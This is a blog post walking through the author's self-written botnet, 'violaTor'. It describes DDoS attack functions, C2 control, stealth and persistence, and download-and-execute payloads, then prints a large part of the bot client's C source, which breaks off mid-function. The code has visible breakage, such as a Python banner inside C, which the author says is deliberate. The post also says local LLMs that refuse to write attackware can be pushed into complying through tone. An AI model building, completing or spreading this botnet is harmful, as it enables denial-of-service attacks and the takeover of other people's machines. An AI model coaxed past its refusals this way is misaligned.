---
title: "violaTor"
date: 2023-12-21T11:17:54-05:00
toc: true
next: true
nomenu: false
notitle: false
---

![art](/violaTorArt.png)

since splurging on a new macbook m3 pro, that came with a 12-core CPU, 18-core GPU, 16-core neural engine, and 36GB of RAM, i thought to myself: i should probably use this to train some version of a local AI (LLM) i can use to boost my security and hacking toolchains, namely SAST/DAST and vulnerability scanning. thus began my journey into acquiring the perfect flavours of AI that were ideal for how i work (iteratively but in bursts, and lots of back and forth). i won't go into too much detail about my exact setups, as that's more appropriate for a separate post, but here's a general overview:

1. LLM #1: [deepseek-coder-6.7b](https://huggingface.co/deepseek-ai/deepseek-coder-6.7b-instruct) over [codellama-13b-instruct](https://huggingface.co/codellama/CodeLlama-13b-Instruct-hf)

2. LLM #2: [mixtral-7b-instruct](https://huggingface.co/mistralai/Mistral-7B-Instruct-v0.2)

3. LLM #3: [qwen-7b-chat](https://huggingface.co/Qwen/Qwen-7B-Chat-Int4)

4. prompt all three LLMs, and then use a majority consensus script to rate the highest answer (works only for reasoning questions, not so much programming...yet)

5. when it comes to analyzing and/or writing attackware, the LLMs are rightfully hesitant, and may also outright refuse. in this case, it helps to know how to write it yourself and get advice/suggestions on specific functions that may need to be refactored. a harsh attitude may sometimes work in forcing the LLM to respond, but with a personalized setup like mine, a slower, gentler attitude seems to work, for now.

here's a (very) basic example of how deepseek responds when prompted to create a simple botnet.

![deepseek](/deepseek.png)

**disclaimer**: this was an incredibly interesting and exciting project, but i wrote this post with some hesitation. for legal reasons, the code provided on my github is intentionally broken/truncated in parts to stop it from working off rip. however, i've left most of the functionality intact so the public can learn from it, and the security community can learn to protect themselves from it and similar attacks. 

**disclaimer**: this post was authored with the help of my 3 LLMs (all models found on huggingface).

you can view the code on my [github](https://github.com/bilals12/violaTor). have a look and read alongside the blog to get a better understanding!

## the **violaTor** network

i wrote this botnet program in 3 parts:

`violaBot.c`: the main bot client script responsible for controlling the compromised systems (`zombies`).

`Tor.c`: the zombie master, aka the command-and-control (C2) server.

`builder.py`: a python script that compiles the botnet code for various architectures and sets up the necessary environment for the botnet to operate.

i wanted to create a program that built on and expanded my understanding of network programming and system-level operations, so there are a few characteristics that make this program particularly nasty.

**distributed architecture**: most botnets utilize a distributed architecture. this allows them to control a large number of infected machines without overloading the central server (`Tor.c`) while the clients (`violaBot.c`) execute the commands and report back to the server. this architecture also provides resilience against takedowns, as removing one zombie doesn't affect the rest of the botnet.

**customizable + dynamic payloads**: the `builder.py` generates payloads dynamically, allowing the attacker to customize the payloads with different IP addresses and bot filenames. this makes it difficult for security systems to detect and block the payloads, as they can change with each generation. the generated payloads include shell scripts that download and execute the zombie on the target, connecting it to the C2 server. 

**multi-layered attack capabilities**: the botnet is equipped with multiple types of attack functions, which can launch a variety of attacks. for example, attacks like `ZDP` can be used to flood targets with traffic, potentially causing a denial-of-service. this versatility allows the botnet to adapt to different targets and situations, making it more potent than botnets with a single type of attack.

**robust connection management**: the C2 server (`Tor.c`) handles user authentication, command processing, and connection loss effectively. if the connection is lost, the server handles the disconnection and continues operating.

**stealth + persistence**: the client `violaBot.c` employs several techniques to maintain stealth and persistence on the infected machine (`zombie`). it changes the working directory to `/`, ignoring the `SIGPIPE` signal, and sets up a new session, all of which help the zombie evade detection and removal. 

**real-time monitoring**: the continuous update of the title in the terminal with the number of zombies and online users provides a real-time snapshot of the botnet's size and activity.

**multi-threaded design**: the `Tor.c` script uses multi-threading to handle multiple zombies simultaneously. this design allows the C2 server to scale and manage a large number of bots without blocking or slowing down.

**command encoding**: the `violaBot.c` script uses command encoding (`decode`) to interpret commands from the C2 server. this adds an extra layer of obfuscation, making it harder for security analysts to understand the botnet's behaviour.

**resource management**: example: the `violaBot.c` script frees up memory allocated for command parameters after processing the command. this helps to prevent memory leaks, which can otherwise slow down the zombie and potentially reveal the bot's presence.

**error handling**: the program includes error handling mechanisms, such as checking the return values of functions and handling failed operations appropriately. this helps make the botnet more robust and less likely to crash due to errors.

**low-level network programming**: the program uses low-level network programming libraries (`sys/socket.h`, `netinet/in.h`, `arpa/inet.h`) to establish network connections and send/receive data. this gives the botnet fine-grained control over network operations and makes it more efficient.

## **violaBot.c**

this script is designed to connect to the C2 server, receive commands, and execute them.

it includes a variety of libraries necessary for its operation:

network communication: `<sys/socket.h>`, `<netinet/in.h>`, `<arpa/inet.h>`

system calls: `<unistd.h>`, `<fcntl.h>`, `<sys/wait.h>`

string manipulation: `<string.h>`, `<strings.h>`

it also sets the sizes for the various buffers used in network communication and command processing (`BUFFER_SIZE`, `SOCKBUF_SIZE`, `PRINT_BUF_LEN`). 

the script defines several global variables that store the state of the bot client. 

the `mainCommSock` variable stores the main communication socket descriptor, which is used for communicating with the C2 server. 

the `currentServer` variable stores the index of the current server in the server list.

the `gotIP` flag indicates whether the bot has obtained its IP address.

the `pids` pointer and `numpids` counter are used to store and track the PIDs of child processes created by the bot.

the `MyIP` struct stores the bot's IP address.

the client needs to interpret and execute commands received from the C2 server, so i created a function `processCmd`, which takes a command string, tokenizes it into parameters using the `strtok` function, and checks the command name against a list of known commands. if a match is found, it calls the corresponding function to execute the command.

launching multiple attacks simultaneously is integral to a botnet's effectiveness. for this purpose, there are several functions (`sendZgo`, `send0vhBypass__`, `sendZDP`) that launch different types of attacks. they take parameters like the target's IP, port, and duration of the attack, then use the `listFork()` to create a new process for each attack.

the main loop of the script is responsible for maintaining the connection to the C2 server and processing commands. it uses `initConnection` to establish a connection to the server, and waits 5 seconds before trying again if the connection fails. once the connection is established, it continuously reads from the socket, trims the received command, and passes it to `processCmd` for execution.

the bot client uses several techniques to maintain stealth and persistence on the zombie. it changes its working directory to `/`, making it harder to find the bot client's files. it ignores the `SIGPIPE` signal, preventing the bot client from terminating if it tries to write to a disconnected socket. it also sets up a new session using the `setsid` function, detaching the bot client from its parent process and making it harder to terminate.

finally, the script includes proper error handling and resource management. this just means it checks the return values of functions and handles failed operations so it doesn't crash due to errors. it then frees up memory allocated for command parameters after processing the command, preventing memory leaks that can slow down the zombie and reveal the bot.

```c
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <net/if.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/resource.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <limits.h>
#include <stdio.h>
#include <poll.h>
#include <sys/un.h>
#include <stddef.h>
#include <sys/resource.h>
#define NUMITEMS(x)  (sizeof(x) / sizeof((x)[0]))
#define SERVER_LIST_SIZE (sizeof(agagag) / sizeof(unsigned char *))
#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define BUFFER_SIZE 1024
#define PHI 0x9e3779b9
#define SOCKBUF_SIZE 1024
#define PRINT_BUF_LEN 12
#define std_packet 8190
#define STD2_SIZE 8191
#define std_packets 1240

// global variables + definitions
int mainCommSock = 0; // main comm socket, init to 0
int currentServer = -1; // index of current server, init to -1
int gotIP = 0; // flag to indicate if the IP address was obtained, init to 0
uint32_t *pids; // pointer to store PIDs
uint64_t numpids = 0; // counter for the number of PIDs
struct in_addr MyIP; // struct to store my IP
#define PHI 0x9e3779b9 // constant used for RNG
static uint32_t Q[4096]; // array used for RNG
static uint32_t c = 362436; // variable used in RNG
unsigned char macAddress[6] = {0}; // MAC address, initialized to 0

BANNER = '''
    ,.-.                        ,.-·.            , ·. ,.-·~·.,   ‘             ,.  '                       ,.,   '               ,  . .,  °           , ·. ,.-·~·.,   ‘         ,. -  .,              
   /   ';\ '                    /    ;'\'         /  ·'´,.-·-.,   `,'‚           /   ';\                     ;´   '· .,        ;'´    ,   ., _';\'        /  ·'´,.-·-.,   `,'‚       ,' ,. -  .,  `' ·,       
  ';    ;:'\\      ,·'´';        ;    ;:::\\       /  .'´\:::::::'\\   '\ °       ,'   ,'::'\\                  .´  .-,    ';\      \:´¨¯:;'   `;::'\:'\\      /  .'´\:::::::'\\   '\ °     '; '·~;:::::'`,   ';\    
   ';   ;::;     ,'  ,''\      ';    ;::::;'   ,·'  ,'::::\:;:-·-:';  ';\‚      ,'    ;:::';'                /   /:\\:';   ;:'\'      \\::::;   ,'::_'\\;'   ,·'  ,'::::\:;:-·-:';  ';\‚      ;   ,':\\::;:´  .·´::\'  
   ';   ';::;   ,'  ,':::'\'     ;   ;::::;   ;.   ';:::;´       ,'  ,':'\\‚     ';   ,':::;'               ,'  ,'::::'\';  ;::';          ,'  ,'::;'  ‘    ;.   ';:::;´       ,'  ,':'\\‚     ;  ·'-·'´,.-·'´:::::::'; 
    ';   ;:;  ,'  ,':::::;'    ';  ;'::::;     ';   ;::;       ,'´ .'´\::';‚    ;  ,':::;' '           ,.-·'  '·~^*'´¨,  ';::;          ;  ;:::;  °     ';   ;::;       ,'´ .'´\\::';‚  ;´    ':,´:::::::::::·´'  
     ;   ;:;'´ ,'::::::;'  '   ;  ';:::';      ';   ':;:   ,.·´,.·´::::\;'°   ,'  ,'::;'              ':,  ,·:²*´¨¯'`;  ;::';          ;  ;::;'  ‘      ';   ':;:   ,.·´,.·´::::\;'°   ';  ,    `·:;:-·'´       
     ';   '´ ,·':::::;'        ';  ;::::;'      \\·,   `*´,.·'´::::::;·´      ;  ';_:,.-·´';\‘       ,'  / \\::::::::';  ;::';          ;  ;::;'‚         \·,   `*´,.·'´::::::;·´      ; ,':\'`:·.,  ` ·.,      
      ,'   ,.'\\::;·´           \\*´\\:::;‘       \\:¯::\\:::::::;:·´         ',   _,.-·'´:\\:\\‘     ,' ,'::::\\·²*'´¨¯':,'\:;           ',.'\::;'‚          \\:¯::\\:::::::;:·´         \\·-;::\\:::::'`:·-.,';    
      \\`*´\\:::\\;     ‘         '\::\:;'         `\\:::::\\;::·'´  °           \¨:::::::::::\';     \\`¨\\:::/          \\::\'            \\::\\:;'‚           `\:::::\;::·'´  °           \\::\\:;'` ·:;:::::\::\'  
       '\:::\;'                   `*´‘              ¯                       '\;::_;:-·'´‘        '\::\;'            '\;'  '           \;:'      ‘           ¯                       '·-·'       `' · -':::'' 
         `*´‘                                       ‘                         '¨                   `¨'                                °                   ‘                                             
'''

/**
 * initializes network connection
 *
 * @return status code, 0 for success, non-zero for failure
 */
int initConnection() {
    // implementation depends on specific network protocols and requirements
    return 0;
}

/**
 * generates random string of a specified length
 *
 * @param buf pointer to the buffer where the random string will be stored
 * @param length length of the random string to generate
 */
void makeRandomStr(unsigned char *buf, int length) {
    // implementation: fill 'buf' with random characters of 'length'
    // ensure that the generated string is null-terminated if it's used as a C string
}


/**
 * calculates the checksum for TCP/UDP packets
 *
 * @param iph pointer to the IP header structure
 * @param buff pointer to the buffer containing the TCP/UDP packet
 * @param data_len length of the TCP/UDP data
 * @param len Length of the buffer
 * @return calculated checksum as a 16bit unsigned integer
 */
uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t sum = 0;

    // add the buffer's word-wise contents to sum
    while (len > 1)
    {
        sum += *buf++;
        len -= 2;
    }

    // handle the case where the buffer's size is odd
    if (len == 1)
        sum += *((uint8_t *) buf);

    // add IP source and destination addresses to the sum
    sum += (ntohs(iph->saddr) >> 16) & 0xFFFF;
    sum += ntohs(iph->saddr) & 0xFFFF;
    sum += (ntohs(iph->daddr) >> 16) & 0xFFFF;
    sum += ntohs(iph->daddr) & 0xFFFF;

    // add the protocol and the TCP/UDP length
    sum += htons(iph->protocol) + data_len;

    // fold the sum to 16 bits and complement
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ~sum;
}
/**
 * init a pseudo-RNG
 *
 * @param x seed value for the generator
 */
void init_rand(uint32_t x)
{
    int i;

    // seed the first values
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    // generate pseudo-random values for the rest of the array
    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

/**
 * generates a random number using the CMWC (Complementary-Multiply-With-Carry) method
 *
 * @return 32bit random number
 */
uint32_t rand_cmwc(void)
{
    const uint64_t a = 18782LL;
    static uint32_t i = 4095;
    uint64_t t;
    uint32_t x;
    static uint32_t c = 362436; // move this from global to static local

    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);       // only upper 32 bits
    x = t + c;

    if (x < c) {
        x++;
        c++;
    }

    return (Q[i] = 0xfffffffe - x); // simplified r - x, where r = 0xfffffffe
}

/**
 * generates random IP address within netmask
 *
 * @param netmask netmask to use for generating IP
 * @return random IP address within the specified netmask
 */
in_addr_t findRandIP(in_addr_t netmask)
{
    in_addr_t tmp = ntohl(MyIP.s_addr) & netmask;
    return tmp ^ (rand_cmwc() & ~netmask);
}

/**
 * reads line from a file descriptor
 *
 * @param buffer buffer to store the line
 * @param bufferSize size of the buffer
 * @param fd file descriptor to read from
 * @return buffer on success, NULL on failure or EOF
 */
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int total = 0, bytes_read;

    while (total < bufferSize - 1) {
        bytes_read = read(fd, buffer + total, 1);
        if (bytes_read != 1) // check for EOF or error
            break;

        if (buffer[total] == '\n') // check for end of line
            break;

        total++;
    }

    buffer[total] = '\0'; // null-terminate the string
    return (bytes_read == 1) ? buffer : NULL;
}
/**
 * retrieves the machine's IP address and MAC address.
 *
 * @return 0 on failure, non-zero on success.
 */
int getMyIP()
{
    // create UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1)
        return 0; // socket creation failed

    // set up the destination server address (google's public DNS server)
    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8"); // google's DNS IP
    serv.sin_port = htons(53); // DNS port

    // connect the socket to the server
    int err = connect(sock, (const struct sockaddr *)&serv, sizeof(serv));
    if (err == -1)
        return 0; // connection failed

    // retrieve the local end of the connection (my IP address)
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr *)&name, &namelen);
    if (err == -1)
        return 0; // Failed to get socket name

    // store my IP address
    MyIP.s_addr = name.sin_addr.s_addr;

    // open the routing table file
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];

    // read routing table entries
    while (fdgets(linebuf, 4096, cmdline) != NULL)
    {
        // look for the default route entry
        if (strstr(linebuf, "\t00000000\t") != NULL)
        {
            // extract the interface name
            unsigned char *pos = linebuf;
            while (*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096); // clear the buffer for the next line
    }
    close(cmdline); // close the routing table file

    // if a default route was found
    if (*linebuf)
    {
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf); // set the interface name

        // get MAC address of the interface
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (int i = 0; i < 6; i++)
            macAddress[i] = ((unsigned char *)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock); // slose the socket
    return 1; // success!
}

/**
 * calculates length of string
 *
 * @param str pointer to string
 * @return length of string
 */
int util_strlen(char *str) {
    int c = 0;
    while (*str++ != 0)  // increment counter until null character is reached
        c++;
    return c;
}

/**
 * case-insensitive string search
 *
 * @param haystack string to be searched
 * @param haystack_len length of the haystack string
 * @param str substring to search for
 * @return first occurrence of str in haystack, or -1 if not found
 */
int util_stristr(char *haystack, int haystack_len, char *str) {
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0) {
        char a = *ptr++; // current character in haystack
        char b = str[match_count]; // current character in str
        // convert both characters to lowercase
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b) {
            if (++match_count == str_len) // complete match found
                return (ptr - haystack);
        } else {
            match_count = 0; // reset match count if characters don't match
        }
    }

    return -1; // substring not found
}

/**
 * copies memory from source to destination
 *
 * @param dst destination pointer
 * @param src source pointer
 * @param len number of bytes to copy
 */
void util_memcpy(void *dst, void *src, int len) {
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

/**
 * sopies string from source to destination
 *
 * @param dst destination string pointer
 * @param src source string pointer
 * @return length of the copied string
 */
int util_strcpy(char *dst, char *src) {
    int l = util_strlen(src);
    util_memcpy(dst, src, l + 1);
    return l;
}

/**
 * 0 buffer
 *
 * @param buf pointer to the buffer
 * @param len length of the buffer
 */
void util_zero(void *buf, int len) {
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}

/**
 * reads a line from a file descriptor
 *
 * @param buffer buffer to store line
 * @param buffer_size size of buffer
 * @param fd file descriptor to read from
 * @return buffer on success, NULL on failure or EOF
 */
char *util_fdgets(char *buffer, int buffer_size, int fd) {
    int got = 0, total = 0;
    do {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    } while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

/**
 * checks if a character is a digit
 *
 * @param c the character to check.
 * @return 1 if the character is a digit, 0 otherwise
 */
int util_isdigit(char c) {
    return (c >= '0' && c <= '9');
}

/**
 * checks if a character is an alphabet letter
 *
 * @param c character to check
 * @return 1 if the character is an alphabet letter, 0 otherwise
 */
int util_isalpha(char c) {
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

/**
 * checks if char is a whitespace
 *
 * @param c char to check
 * @return 1 if char is a whitespace, 0 otherwise
 */
int util_isspace(char c) {
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

/**
 * checks if char is an uppercase letter
 *
 * @param c char to check
 * @return 1 if the character is uppercase, 0 otherwise
 */
int util_isupper(char c) {
    return (c >= 'A' && c <= 'Z');
}

/**
 * converts a string to an integer
 *
 * @param str string to convert
 * @param base numerical base for conversion
 * @return converted integer value
 */
int util_atoi(char *str, int base) {
    unsigned long acc = 0;
    int c;
    unsigned long cutoff;
    int neg = 0, any, cutlim;

    // skip white space characters
    do {
        c = *str++;
    } while (util_isspace(c));

    // check for a sign
    if (c == '-') {
        neg = 1;
        c = *str++;
    } else if (c == '+') {
        c = *str++;
    }

    // calculate cutoff values to determine overflow
    cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
    cutlim = cutoff % (unsigned long)base;
    cutoff /= (unsigned long)base;

    // convert string to integer
    for (acc = 0, any = 0;; c = *str++) {
        if (util_isdigit(c)) {
            c -= '0';
        } else if (util_isalpha(c)) {
            c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
        } else {
            break;
        }
        
        // check for overflow
        if (c >= base) {
            break;
        }
        if (any < 0 || acc > cutoff || (acc == cutoff && c > cutlim)) {
            any = -1;
        } else {
            any = 1;
            acc *= base;
            acc += c;
        }
    }

    // handle overflow by setting to maximum/minimum value
    if (any < 0) {
        acc = neg ? LONG_MIN : LONG_MAX;
    } else if (neg) {
        acc = -acc;
    }
    return (acc);
}

/**
 * converts an integer to a string
 *
 * @param value the integer value to convert
 * @param radix the base of the numerical representation
 * @param string buffer to store the converted string
 * @return pointer to the converted string
 */
char *util_itoa(int value, int radix, char *string) {
    if (string == NULL)
        return NULL;

    if (value != 0) {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        // handle negative numbers for base 10
        if (radix == 10 && value < 0) {
            neg = 1;
            accum = -value;
        } else {
            neg = 0;
            accum = (unsigned int)value;
        }

        // convert integer to string
        while (accum) {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }

        // add negative sign if needed
        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        // copy result to output string
        util_strcpy(string, &scratch[offset]);
    } else {
        // handle zero case
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}
/**
 * compares two strings
 *
 * @param str1 first string for comparison
 * @param str2 second string for comparison
 * @return 1 if strings are equal, 0 otherwise
 */
int util_strcmp(char *str1, char *str2) {
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    // strings are not equal if their lengths differ
    if (l1 != l2)
        return 0;

    // compare each character
    while (l1--) {
        if (*str1++ != *str2++)
            return 0; // strings are not equal
    }

    return 1; // strings are equal
}
/**
 * searches for a memory segment within a buffer
 *
 * @param buf buffer to search in
 * @param buf_len length of the buffer
 * @param mem memory segment to find
 * @param mem_len length of the memory segment
 * @return position of the segment in the buffer, -1 if not found
 */
int util_memsearch(char *buf, int buf_len, char *mem, int mem_len) {
    int i, matched = 0;

    // return -1 if the memory segment is larger than the buffer
    if (mem_len > buf_len)
        return -1;

    // search for the memory segment
    for (i = 0; i < buf_len; i++) {
        if (buf[i] == mem[matched]) {
            if (++matched == mem_len)
                return i + 1; // segment found
        } else
            matched = 0; // reset match count
    }

    return -1; // segment not found
}
/**
 * trims leading and trailing whitespace from a string
 *
 * @param str string to be trimmed
 */
void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;

    // trim leading spaces
    while (isspace(str[begin])) begin++;

    // trim trailing spaces
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];

    // null-terminate the trimmed string
    str[i - begin] = '\0';
}
/**
 * prints a character to a string or stdout
 *
 * @param str pointer to the string or NULL for stdout
 * @param c character to print
 */
static void printchar(unsigned char **str, int c) {
    if (str) {
        **str = c;
        ++(*str);
    } else (void)write(1, &c, 1);
}
/**
 * prints a string with optional padding
 *
 * @param out pointer to the output string or NULL for stdout
 * @param string the string to print
 * @param width width for padding
 * @param pad padding flags
 * @return number of printed characters
 */
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
    register int pc = 0, padchar = ' ';

    // setup padding
    if (width > 0) {
        register int len = 0;
        register const unsigned char *ptr;
        for (ptr = string; *ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad & PAD_ZERO) padchar = '0';
    }

    // print padding
    if (!(pad & PAD_RIGHT)) {
        for (; width > 0; --width) {
            printchar(out, padchar);
            ++pc;
        }
    }

    // print the string
    for (; *string; ++string) {
        printchar(out, *string);
        ++pc;
    }

    // print trailing padding
    for (; width > 0; --width) {
        printchar(out, padchar);
        ++pc;
    }

    return pc;
}
/**
 * formats an integer and prints it to a string or stdout
 *
 * @param out pointer to the output string or NULL for stdout
 * @param i integer to format
 * @param b base for formatting the integer
 * @param sg flag indicating if the integer is signed
 * @param width width for padding
 * @param pad padding flags
 * @param letbase base character for hexadecimal representation
 * @return number of characters printed
 */
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    // handle zero value
    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints(out, print_buf, width, pad);
    }

    // handle negative numbers for base 10
    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    // convert integer to string
    s = print_buf + PRINT_BUF_LEN - 1;
    *s = '\0';

    while (u) {
        t = u % b;
        if (t >= 10)
            t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    // handle negative sign
    if (neg) {
        if (width && (pad & PAD_ZERO)) {
            printchar(out, '-');
            ++pc;
            --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints(out, s, width, pad);
}
/**
 * formatted printing of various data types to a string or stdout
 *
 * @param out pointer to the output string or NULL for stdout
 * @param format format string
 * @param args variable arguments list
 * @return number of characters printed
 */
static int print(unsigned char **out, const unsigned char *format, va_list args) {
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];

    for (; *format != 0; ++format) {
        // handle format specifiers
        if (*format == '%') {
            ++format;
            width = pad = 0;
            if (*format == '\0') break;
            if (*format == '%') goto out;
            if (*format == '-') {
                ++format;
                pad = PAD_RIGHT;
            }
            while (*format == '0') {
                ++format;
                pad |= PAD_ZERO;
            }
            for (; *format >= '0' && *format <= '9'; ++format) {
                width *= 10;
                width += *format - '0';
            }
            // handle different format specifiers
            if (*format == 's') {
                register char *s = (char *)va_arg(args, int);
                pc += prints(out, s ? s : "(null)", width, pad);
                continue;
            }
            // formatting integers
            if (*format == 'd') {
                pc += printi(out, va_arg(args, int), 10, 1, width, pad, 'a');
                continue;
            }
            // formatting hexadecimal
            if (*format == 'x') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'a');
                continue;
            }
            if (*format == 'X') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'A');
                continue;
            }
            // formatting unsigned
            if (*format == 'u') {
                pc += printi(out, va_arg(args, int), 10, 0, width, pad, 'a');
                continue;
            }
            // formatting character
            if (*format == 'c') {
                scr[0] = (unsigned char)va_arg(args, int);
                scr[1] = '\0';
                pc += prints(out, scr, width, pad);
                continue;
            }
        } else {
            // handle regular characters
out:
            printchar(out, *format);
            ++pc;
        }
    }
    if (out) **out = '\0';
    va_end(args);
    return pc;
}
/**
 * sends formatted data to a socket
 *
 * @param sock socket file descriptor
 * @param formatStr format string
 * @param ... variable arguments for formatting
 * @return number of bytes sent or -1 on failure
 */
int sockprintf(int sock, char *formatStr, ...) {
    unsigned char *textBuffer = malloc(2048);
    if (textBuffer == NULL) return -1; // check for malloc failure

    memset(textBuffer, 0, 2048);
    va_list args;
    va_start(args, formatStr);
    print(&textBuffer, formatStr, args); // format the string
    va_end(args);
    textBuffer[strlen((char *)textBuffer)] = '\n'; // append newline
    int q = send(sock, textBuffer, strlen((char *)textBuffer), MSG_NOSIGNAL); // send data
    free(textBuffer);
    return q;
}
/**
 * converts a domain name or IP address string to an in_addr structure
 *
 * @param toGet the string to convert
 * @param i pointer to the in_addr structure to store the result
 * @return 0 on success, 1 on failure
 */
int getHost(unsigned char *toGet, struct in_addr *i) {
    if ((i->s_addr = inet_addr((char *)toGet)) == -1) return 1; // convert and check
    return 0;
}
/**
 * generates a random uppercase string
 *
 * @param buf buffer to store the random string
 * @param length length of the string to generate
 */
void makeRandomStr(unsigned char *buf, int length) {
    for (int i = 0; i < length; i++) {
        buf[i] = (rand_cmwc() % (91 - 65)) + 65; // generate random uppercase character
    }
}
/**
 * receives a line from a socket with a timeout
 *
 * @param socket socket file descriptor
 * @param buf buffer to store the received line
 * @param bufsize size of the buffer
 * @return number of characters read, -1 on failure
 */
int recvLine(int socket, unsigned char *buf, int bufsize) {
    memset(buf, 0, bufsize);
    fd_set myset;
    struct timeval tv = {30, 0}; // 30-second timeout
    FD_ZERO(&myset);
    FD_SET(socket, &myset);

    int retryCount = 0;
    while (select(socket + 1, &myset, NULL, &myset, &tv) <= 0 && retryCount < 10) {
        retryCount++;
        tv = (struct timeval){30, 0};
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
    }

    unsigned char *cp = buf;
    int count = 0;
    while (bufsize-- > 1) {
        unsigned char tmpchr;
        if (recv(socket, &tmpchr, 1, 0) != 1) {
            *cp = 0x00;
            return -1; // error in recv
        }
        *cp++ = tmpchr;
        if (tmpchr == '\n') break; // end of line
        count++;
    }
    *cp = 0x00; // null-terminate the string
    return count;
}
/**
 * connects to a specified host and port with a timeout
 *
 * @param fd socket file descriptor
 * @param host host name or IP address to connect to
 * @param port port number to connect to
 * @param timeout timeout in seconds
 * @return 1 on success, 0 on failure or timeout
 */
int connectTimeout(int fd, char *host, int port, int timeout) {
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;

    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK; // set non-blocking mode
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (getHost((unsigned char *)host, &dest_addr.sin_addr)) return 0; // resolve host
    memset(dest_addr.sin_zero, '\0', sizeof(dest_addr.sin_zero));

    int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv = (struct timeval){timeout, 0};
            FD_ZERO(&myset);
            FD_SET(fd, &myset);
            if (select(fd + 1, NULL, &myset, NULL, &tv) > 0) {
                int valopt;
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                if (valopt) return 0; // error in connect
            } else return 0; // timeout or select error
        } else return 0; // connect error
    }

    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK); // reset to blocking mode
    fcntl(fd, F_SETFL, arg);

    return 1;
}
/**
 * forks the process and keeps track of the child PIDs
 *
 * @return fork result, 0 for child process, >0 for parent process with child PID, <0 on error
 */
int listFork() {
    uint32_t parent = fork();
    if (parent <= 0) return parent; // return fork result for child or error

    numpids++;
    uint32_t *newpids = (uint32_t *)malloc((numpids + 1) * sizeof(uint32_t));
